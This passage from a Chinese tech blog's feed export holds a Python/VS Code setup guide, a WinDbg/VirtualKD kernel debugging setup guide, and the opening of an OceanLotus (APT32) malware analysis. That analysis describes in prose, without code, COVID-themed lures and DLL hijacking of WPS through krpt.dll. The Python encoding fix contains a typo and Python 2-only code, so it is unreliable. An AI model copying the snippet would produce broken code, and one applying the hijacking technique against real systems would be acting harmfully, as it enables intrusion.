installation</code>自定义来进行安装，一路默认安装就可。</p><p><strong>注：上图中红框中的选项，分别是将Python安装给windows的所有用户；添加Python环境变量。</strong></p><p>然后可以根据自己的需求选择安装的<strong>目录</strong>和<strong>路径</strong>（注：如果需要下载python的调试符号需要<font color=red><b>翻墙</b></font>，否则会报错），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923221324922.png" alt="image-20200923221324922"></p><p>安装成功，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923221748772.png" alt="image-20200923221748772"></p><p>我们在<strong>检查下 Python 的环境变量是否正常</strong>，打开CMD，执行命令，如图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python -V//V大写 查看 python 版本信息  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923222030265.png" alt="image-20200923222030265"></p><h2 id="第三方包安装"><a href="#第三方包安装" class="headerlink" title="第三方包安装"></a>第三方包安装</h2><blockquote><p>接下来需要安装两个一会配置 VScode 需要的包。</p><p>flake8 ：检查编写代码时的不规范的地方和语法错误。</p><p>yapf ：是一个代码格式化的工具，可以一键美化代码（Alt+Shift+F）。</p></blockquote><p>可以通过 Pyton 自带的 pip 工具来进行下载。安装过程如下：</p><ul><li>在 cmd 中输入 <code>pip install flake8</code> ，下载安装 flake8 。</li><li>在 cmd 中输入 <code>pip install yapf</code>，下载安装 yapf 。</li></ul><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923222256635.png" alt="image-20200923222256635"></p><p>这里需要注明一下，由于 Python 第三方库的服务器被墙了，所以用 pip下载的时候是访问不通的。挂代理的话速度也不会很快。不过清华大学提供的有国内的 Python 库，可供大家下载，能大幅度提高下载速度。具体操作如下：</p><p>打开CMD执行如下指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pip -U</span><br><span class="line">pip config set <span class="keyword">global</span>.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923222504627.png" alt="image-20200923222504627"></p><h2 id="VScode-安装"><a href="#VScode-安装" class="headerlink" title="VScode 安装"></a>VScode 安装</h2><p>安装 VScode 就很简单了，一路 Next 就好。</p><p>VScode 的下载链接：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200331084617078.png" alt="image-20200331084617078"></p><h2 id="配置-VScode"><a href="#配置-VScode" class="headerlink" title="配置 VScode"></a>配置 VScode</h2><p><strong>安装插件</strong></p><p>快捷键<code>Ctrl +Shift+X</code>，或鼠标点击选择<code>Extensions</code>，然后依次安装如图下图的插件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923223025050.png" alt="image-20200923223025050"></p><p><strong>配置settings.json</strong></p><p>点击设置，打开配置文件，选择用户中的<code>settings.json</code>中编辑（在这里编辑的设置是针对当前用户全局的，当需要有工作区想做特殊设置可以再在工作区设置，工作区的设置优先级大于全局），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200610112506935.png" alt="image-20200610112506935"></p><p>将如下代码填写至<code>settings.json</code>中，如图：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;python.linting.flake8Enabled&quot;</span>: <span class="literal">true</span>, </span><br><span class="line">    <span class="attr">&quot;python.formatting.provider&quot;</span>: <span class="string">&quot;yapf&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;python.linting.flake8Args&quot;</span>: [<span class="string">&quot;--max-line-length=248&quot;</span>],</span><br><span class="line">    <span class="attr">&quot;python.linting.pylintEnabled&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;files.insertFinalNewline&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;files.autoSave&quot;</span>: <span class="string">&quot;afterDelay&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;files.autoSaveDelay&quot;</span>: <span class="number">1000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923222925819.png" alt="image-20200923222925819"></p><p>然后就可以写 Python 的代码了。</p><p>配置完这些后，写的 python 文件会每 1000s 自动保存一次。并且可通过快捷方式 <code>Alt+Shift+F</code>，来进行对齐（Python对缩进很敏感）。</p><h1 id="0x01-中文用户名解决方案"><a href="#0x01-中文用户名解决方案" class="headerlink" title="0x01 中文用户名解决方案"></a>0x01 中文用户名解决方案</h1><p>win10支持中文用户名，从而有不少人会使用中文用户名，这会导致在使用python时有些时候会报错。因此这里提醒大家以后重装系统尽量将用户名设置为英文的。那么既然问题出现了，就要想办法解决。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>修改 Python 安装目录 Python\Lib 目录下的 mimetypes.py 文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200405231123695.png" alt="image-20200405231123695"></p><p>增加如下三行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> sys.getdefaultencoding() != <span class="string">&#x27;gbk&#x27;</span>:</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultendoding(<span class="string">&#x27;gbk&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200405231159906.png" alt="image-20200405231159906"></p><p>再去 Python\Lib\sit-packages 建一个 sitecustomize.py ，内容为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;gb2312&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200405231725212.png" alt="image-20200405231725212"></p><p>然后中文用户名就不会影响到你正常下载第三方安装包了。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VScode </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双机调试环境搭建</title>
      <link href="2020/02/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>2020/02/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<center><font size =8><b>双机调试环境搭建</b></font></center><h1 id="0x00-WinDbg安装及符号配置"><a href="#0x00-WinDbg安装及符号配置" class="headerlink" title="0x00 WinDbg安装及符号配置"></a>0x00 WinDbg安装及符号配置</h1><h2 id="WinDbg安装"><a href="#WinDbg安装" class="headerlink" title="WinDbg安装"></a>WinDbg安装</h2><p><strong>官方版</strong></p><p>首先可以从微软官方下载WDK，WDK会自带<code>WinDbg</code>调试器。微软WDK官方下载链接：<a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk%E3%80%82%E4%B8%8B%E8%BD%BD%E5%AE%8C%E4%B9%8B%E5%90%8E%E4%B8%80%E8%B7%AF%E9%BB%98%E8%AE%A4%E4%B8%8B%E4%B8%80%E6%AD%A5%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk。下载完之后一路默认下一步即可，如图：</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325224210154.png" alt="image-20200325224210154"></p><p><strong>微软商城版</strong></p><p>上面下载的是WDK自带的调试器，其实在微软应用商店也是可以下载到WinDbg Preview版本的，只需要打开商城搜索<code>WinDbg Preview</code>，下载便是，并且这个版本的界面会更加舒适些。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325224824570.png" alt="image-20200325224824570"></p><h2 id="配置符号路径"><a href="#配置符号路径" class="headerlink" title="配置符号路径"></a>配置符号路径</h2><p>按上面的步奏安装即可，安装完之后便需要配置==符号路径==。</p><p>第一步，添加<code>WinDbg</code>的路径到主<code>Path</code>环境变量中，将WinDbg的主路径<code>C:\Program Files (x86)\Windows Kits\10\Debuggers</code>，添加进环境变量<code>Path</code>中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325230023064.png" alt="image-20200325230023064"></p><p>第二步，新建一个环境变量名为<code>_NT_SYMBOL_PATH</code>，并设置其值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SRV*C:\Symbol*http:&#x2F;&#x2F;msdl.microsoft.com&#x2F;download&#x2F;symbols</span><br></pre></td></tr></table></figure><p>其中路径<code>&lt;C:Symbol&gt;</code>可随意设置，看你想把下载到的符号放在那里。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325230549052.png" alt="image-20200325230549052"></p><p>弄完上面两步，符号路径就配置好了，附加一下计算器查看一下效果。附加上计算器后，在<code>WinDbg</code>最上处便会显示配置好的符号路径，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325231049910.png" alt="image-20200325231049910"></p><h2 id="加载需要的模块符号"><a href="#加载需要的模块符号" class="headerlink" title="加载需要的模块符号"></a>加载需要的模块符号</h2><p>由于微软的符号链接服务器 <a href="http://msdl.microsoft.com/download/symbols%E8%A2%AB%E5%A2%99%E4%BA%86%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%A6%81%E4%BB%8E%E5%BE%AE%E8%BD%AF%E4%B8%8B%E8%BD%BD%E7%AC%A6%E5%8F%B7%E6%96%87%E4%BB%B6%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%BC%80%E4%BB%A3%E7%90%86%E3%80%82">http://msdl.microsoft.com/download/symbols被墙了，因此要从微软下载符号文件时，需要开代理。</a></p><p><strong>命令LD</strong></p><p>然后可以通过命令<code>lm</code>查看当前加载的模块以及加载的符号文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325231619454.png" alt="image-20200325231619454"></p><p>如若想在添加某个模块的符号文件，可使用命令<code>ld &lt;Moudle&gt;</code>来加载，例如加载Calcuator模块，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325231834557.png" alt="image-20200325231834557"></p><p><strong>symchk.exe命令行下载</strong></p><p>找到<code>WinDbg</code>的目录下，打开CMD输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symchk [&#x2F;r] [&#x2F;q] [Input options] &lt;Filename&gt; [&#x2F;s &lt;SymbolPath&gt;] [options]</span><br><span class="line">symchk.exe -v  &lt;MoudleName&gt;</span><br><span class="line">symchk.exe -v  &lt;MoudleName&gt;  -s  &lt;SymbolPath&gt;</span><br><span class="line">例如：symchk.exe -v kernel32.dll -s  –s srv*&lt;Path&gt;* https:&#x2F;&#x2F;msdl.microsoft.com&#x2F;download&#x2F;symbols</span><br></pre></td></tr></table></figure><p>要下载如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325234012586.png" alt="image-20200325234012586"></p><h1 id="0x01-VirtualKD安装配置"><a href="#0x01-VirtualKD安装配置" class="headerlink" title="0x01 VirtualKD安装配置"></a>0x01 VirtualKD安装配置</h1><p>从VirtualKD官网<a href="https://sysprogs.com/legacy/virtualkd/%EF%BC%8C%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD(%E5%8F%AA%E6%94%AF%E6%8C%81VM15.5%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC,VM15.5%E4%BB%A5%E4%B8%8A%E7%9A%84%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%60VirtualKD-redux%60%E5%90%8E%E9%9D%A2%E6%9C%89%E4%BB%8B%E7%BB%8D)%E3%80%82%E4%B8%8B%E8%BD%BD%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">https://sysprogs.com/legacy/virtualkd/，进行下载(只支持VM15.5以下版本,VM15.5以上的可以使用`VirtualKD-redux`后面有介绍)。下载后解压即可，如图：</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325234341801.png" alt="image-20200325234341801"></p><p>然后将解压后的<code>target</code>文件夹，拖入虚拟机中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200325234624826.png" alt="image-20200325234624826"></p><p>然后在虚拟机中运行<code>vminstall.exe</code>，来安装VirtualKD。安装完会提示重启，直接重启就好。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200326082651300.png" alt="image-20200326082651300"></p><p>在重启之前，在本机上运行<code>vmmon.exe</code>（vmmon.exe调试32位虚拟机，vmmon64.exe调试64位虚拟机）。然后在配置WinDbg的路径，选中windbg的路径即可，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200326083222305.png" alt="image-20200326083222305"></p><p><strong>补充WinDbg调试器版本选择：</strong></p><blockquote><p>1.×86-based Host Computer</p><p>在x86处理器平台上，即使调试的目标操作系统是x64版本的，也应该使用x86版本的WinDhg。</p><p>2.x64-based Host Computer</p><p>在x64处理器平台上，需要按如下规则来选择版本。</p><ul><li>在分析Dump文件时（不管是用户模式Dump，还是内核模式Dump），如果Dump文件是在Windows XP及更新版本的操作系统上生成的，那么x86或x64版本的WinDbg均可使用；如果Dump文件是在Windows2000或更早版本的操作系统上生成的，就只能使用x86版本的WinDbg了。</li><li>在进行双机实时调试时，如果目标系统是Windows XP及更新版本的操作系统，那么×86或x64版本的WinDbg均可使用，WinDbg会自动适应；如果目标系统是Windows2000或更早版本的操作系统，就只能使用x86版本的WinDhg进行调试了。</li><li>在进行用户态实时调试时，如果目标程序是原生64位程序，则只能使用x64版本的WinDbg进行调试；如果目标程序是32位程序，那么既可以使用×86版本，也可以使用x64版本，但因为x86版本只能调试32位代码，所以与在x86平台上调试32位程序没有区别；如果使用x64版本，可以额外调试WOW64部分的代码，这对研究WOW64机制非常有用。不过，除了研究WOW64机制，在其他情况下还是应该直接根据目标程序的类型选择相应的WinDbg版本。</li></ul></blockquote><p>然后等虚拟机重启起来之后，在进入系统之前选择如图选项：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200326083439997.png" alt="image-20200326083439997"></p><p>就能实现用WinDbg+VirtualKD进行双击调试了，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200326083741102.png" alt="image-20200326083741102"></p><blockquote><p>注：由于VirtualKD不再维护了，因此对于VM15.5以后的版本不再适用，这里可以适用大神编写的VirtualKD-Redux版，连接为：<a href="https://github.com/4d61726b/VirtualKD-Redux%E3%80%82%E7%94%B1%E4%BA%8E%E6%98%AF%E5%BC%80%E6%BA%90%E7%9A%84%E5%9B%A0%E6%AD%A4%E5%9C%A8%E9%80%89%E6%8B%A9suffix(%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9)%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81F8%E7%A6%81%E7%94%A8%E5%BC%BA%E5%88%B6%E7%AD%BE%E5%90%8D%EF%BC%8C%E4%BE%BF%E5%8F%AF%E6%AD%A3%E5%B8%B8%E4%BD%BF%E7%94%A8%E3%80%82">https://github.com/4d61726b/VirtualKD-Redux。由于是开源的因此在选择suffix(开机启动项)时，需要F8禁用强制签名，便可正常使用。</a></p></blockquote><h2 id="win10-virtual-KD-配置"><a href="#win10-virtual-KD-配置" class="headerlink" title="win10 virtual KD 配置"></a>win10 virtual KD 配置</h2><blockquote><p>近期工作需要，需要双机调试WIN10虚拟机，在调试时发现virtualKD怎么都安装不上，查了相关资料后才解决，这里简单说明记录一下。</p></blockquote><p>首先打开虚拟机的设置，选择选项中的固件类型，将<code>UEFI的启用安全引导</code>选项关闭，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/01_%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200617160551014.png" alt="image-20200617160551014"></p><p>然后在开机，装virtualKD就可以进行双机调试了。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APT_海莲花分析报告02</title>
      <link href="2020/02/15/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/"/>
      <url>2020/02/15/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>海莲花分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><blockquote><p><strong>2020年的2月前后，我国爆发了急剧传染性质的新型冠状病毒（2019-nCoV），举国上下防范新型冠状病毒。然而却有不法分子借由此热点事件来传播电脑病毒。就如本片文章分析的由”<code>海莲花（OceanLotus）</code>“组织发起的的恶意攻击，借由新型冠转病毒这一热点事件来诱导受害者运行恶意文件，来达到往目标主机植入远控软件的目的。</strong></p><p><strong>“<code>海莲花</code>”（又名APT32、OceanLotus），被认为是来自越南的APT攻击组织，自2012年活跃以来，一直针对中国大陆的政府部门、海事机构、外交机构、大型国企、科研机构以及部分重要的私营企业等进行攻击活动，是近几年来针对中国大陆进行攻击活动最活跃的APT攻击组织，甚至没有之一。</strong></p><p><strong>本次样本是由<code>Gcow团队</code>提供的，Gcow团队共捕获到了最新的海莲花样本5个，并将其中的2个样本交由我来分析。下面就开始剖析该样本。</strong></p></blockquote><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><table><thead><tr><th>样本名称</th><th>文件类型</th></tr></thead><tbody><tr><td>冠状病毒实时更新：中国正在追踪来自湖北的旅行者</td><td>可执行程序</td></tr><tr><td>湖南省家禽H5N1亚型高致病性禽流感疫情情况</td><td>可执行程序</td></tr><tr><td>Krpt.dll</td><td>动态链接库文件</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200319231004667.png" alt="样本信息图"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="海莲花流程图"></p><h1 id="0x01-动态行为"><a href="#0x01-动态行为" class="headerlink" title="0x01 动态行为"></a>0x01 动态行为</h1><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/%E6%B5%B7%E8%8E%B2%E8%8A%B1.gif" alt="海莲花"></p><h1 id="0x02-样本详细分析"><a href="#0x02-样本详细分析" class="headerlink" title="0x02 样本详细分析"></a>0x02 样本详细分析</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><blockquote><p>本次==海莲花==组织是通过利用白文件<strong>WPS</strong>在其运行时会加载<code>krpt.dll</code>这一特点，将原本正常的<code>krpt.dll</code>文件替换为同名恶意动态链接库文件（<strong>DLL劫持</strong>），来实现往目标主机植入远控软件的。</p></blockquote><p>从<strong>样本信息图</strong>中不难看出，名为“<strong>冠状病毒实时更新：中国正在追踪来自湖北的旅行者、湖南省家禽H5N1亚型高致病性禽流感疫情情况</strong>”实则为应用程序（.exe）。通过伪装为正常的WORD文件，并起名为实时热点信息（新型冠状病毒相关），来诱导用户点击。不仅如此该可执行文件还是正常白文件<strong>WPS</strong>的主体进程文件，在一定程度上能逃避杀软查杀。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200319233917982.png" 